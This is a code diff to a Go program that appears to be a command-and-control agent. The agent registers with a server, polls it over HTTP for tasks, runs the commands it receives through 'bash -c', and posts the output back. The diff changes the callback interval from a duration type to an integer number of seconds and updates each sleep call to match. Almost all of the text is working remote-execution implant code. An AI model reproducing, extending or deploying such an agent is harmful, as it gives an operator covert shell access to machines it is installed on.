@@ -16,7 +16,7 @@ type Agent struct {
     LocalIP       string
     ServerIP     string
     ServerPort    int
-	CallbackInterval time.Duration
+	CallbackInterval int
 	Client        *http.Client
 }
 
@@ -95,8 +95,7 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 
 	switch task.Action {
 	case "command":
-		var cmd *exec.Cmd
-		cmd = exec.Command("bash", "-c", task.Command)
+		cmd := execCommand(task.Command)
 		out, err := cmd.CombinedOutput()
 		if err != nil {
 			result.Result = string(out)
@@ -117,7 +116,7 @@ func main(){
         LocalIP:  getLocalIP(),
         ServerIP: "127.0.0.1",
         ServerPort: 80,
-		CallbackInterval: 60 * time.Second,
+		CallbackInterval: 15,
 		Client: &http.Client{
             Timeout: 10 * time.Second,
         },
@@ -128,7 +127,7 @@ func main(){
 		err := agent.Register()
 		if err != nil {
 			//fmt.Println("Error registering agent:", err)
-			time.Sleep(agent.CallbackInterval)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		break
@@ -141,20 +140,20 @@ func main(){
 		jsonData, err := json.Marshal(ip_json)
 		if err != nil {
 			fmt.Println("Error marshaling JSON:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 		if err != nil {
 			fmt.Println("Error creating request:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		req.Header.Set("Content-Type", "application/json")
 		resp,err := agent.Client.Do(req)
 		if err != nil {
 			fmt.Println("Error sending request:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		
@@ -166,11 +165,11 @@ func main(){
 
         if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
             fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
-            time.Sleep(agent.CallbackInterval)
+            time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
             continue
         } else if resp.StatusCode == 204 {
             // No tasks
-            time.Sleep(agent.CallbackInterval)
+            time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
             continue
         }
 
@@ -178,13 +177,13 @@ func main(){
 		err = json.NewDecoder(resp.Body).Decode(&task)
 		if err != nil {
 			fmt.Println("Error decoding JSON:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		result, err := agent.HandleTask(task)
 		if err != nil {
 			fmt.Println("Error handling task:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		// Send the result back to the server
@@ -192,25 +191,25 @@ func main(){
 		jsonData, err = json.Marshal(result)
 		if err != nil {
 			fmt.Println("Error marshaling JSON:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		req, err = http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 		if err != nil {
 			fmt.Println("Error creating request:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		req.Header.Set("Content-Type", "application/json")
 		resp, err = agent.Client.Do(req)
 		if err != nil {
 			fmt.Println("Error sending request:", err)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
 			fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
-			time.Sleep(agent.CallbackInterval * time.Second)
+			time.Sleep(time.Duration(agent.CallbackInterval) * time.Second)
 			continue
 		}
 	}
